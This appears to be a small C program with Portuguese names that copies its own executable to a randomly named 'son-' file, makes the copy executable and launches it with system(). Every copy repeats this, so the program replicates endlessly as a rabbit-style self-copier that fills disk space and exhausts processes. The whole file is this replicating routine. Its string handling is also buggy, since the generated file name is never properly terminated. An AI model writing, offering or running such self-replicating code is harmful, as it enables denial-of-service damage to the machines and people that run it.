#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>
#include <sys/stat.h>
#include <pthread.h>

#define END_SUCCESS_CODE 0

char * createStr(){
	char * str;
	int8_t len = 5;
	str = (char *)malloc(sizeof(char) * len);
	strcpy(str, "son-");
	
	int8_t tam = (rand() % 3) + 1;
	str = (char *)realloc(str, sizeof(char) * (len + tam) );
	for(int8_t i = 0; i < tam; i ++){
		char c = (char) ( rand() % 10 + 48);
		str[len - 1] = c;
		len ++;
	}
	tam = (rand() % 3) + 1;
	str = (char *)realloc(str, sizeof(char) * (len + tam) );
	for(int8_t i = 0; i < tam; i ++){
		char c = (char) ( rand() % 26 + 97);
		str[len - 1] = c;
		len ++;
	}

	return str;

}
char * fileName(){
	FILE * fl;
	char * str = createStr();
	fl = fopen(str, "r");
	
	while(fl != NULL){ // o arquivo existe
		fclose(fl);
		str = createStr();
		fl = fopen(str, "r");
	}

	return str;
}

void *reproduzir(void * arg){
	char *file = (char *)arg;
	char * name = fileName();
	
	FILE * me = fopen(file, "rb");
	FILE * rep = fopen(name, "wb");

	char c = ' ';
	while(! feof(me)){
		fread(&c, sizeof(char), 1, me);
	       	fwrite(&c, sizeof(char), 1, rep);
	}
		
	chmod(name, S_IRUSR | S_IWUSR | S_IXUSR);

	fclose(me);
	fclose(rep);
	
	char cmd[256];
	strcpy(cmd, "./");
	strcat(cmd, name);
	system(cmd);
	

	pthread_exit(NULL);
}

int main(int argc, char ** argv){
	srand(time(NULL));

    	pthread_t minha_thread;

   	if (pthread_create(&minha_thread, NULL, reproduzir, (void *)argv[0])){
        	fprintf(stderr, "Erro ao criar a thread\n");
        	return 1;
	}

    	pthread_join(minha_thread, NULL);


	return END_SUCCESS_CODE;
}
